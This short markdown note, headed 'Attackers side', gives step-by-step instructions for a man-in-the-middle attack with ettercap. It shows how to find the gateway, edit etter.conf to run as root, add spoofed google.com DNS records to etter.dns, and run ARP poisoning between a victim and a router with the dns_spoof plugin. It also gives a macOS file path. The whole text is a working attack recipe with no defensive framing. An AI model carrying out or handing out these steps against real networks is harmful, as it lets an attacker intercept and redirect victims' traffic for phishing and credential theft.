## in Attackers side : 
#### Look interface name with `ifconfig` (where ip address is present)
#### Find router IP with `route -n` (under gateway section)

Edit `/etc/ettercap/etter.conf` :
```text
set --> 
ec_uid = 0
ec_gid = 0
and uncomment 4 lines in "linux section"
```


Edit `/etc/ettercap/etter.dns` with :
```text
google.com A (targetIP)
*.google.com A (target IP)
www.google.com PTR (target IP)
```

then run :
```sh
sudo ettercap -T -q -i (interface) -M arp:remote /(Victim)// /(Router)// -P dns_spoof
```


in macos :
`/opt/homebrew/o/ettercap/.bottle/etc/ettercap/ettercap.dns` location
